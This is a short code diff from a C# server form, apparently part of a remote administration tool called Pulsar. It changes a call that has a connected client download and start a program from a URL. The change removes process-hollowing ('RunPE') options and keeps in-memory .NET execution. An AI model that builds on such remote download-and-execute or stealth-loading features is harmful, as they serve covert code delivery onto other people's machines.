@@ -161,7 +161,7 @@ namespace Pulsar.Server.Forms
                     if (!txtURL.Text.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                         txtURL.Text = "http://" + txtURL.Text;
 
-                    handler.TaskHandler.StartProcessFromWeb(txtURL.Text, _isUpdate, _executeInMemoryDotNet, _useRunPE, _runPETarget, _runPECustomPath);
+                    handler.TaskHandler.StartProcessFromWeb(txtURL.Text, _isUpdate, _executeInMemoryDotNet);
                 }
             }
             else
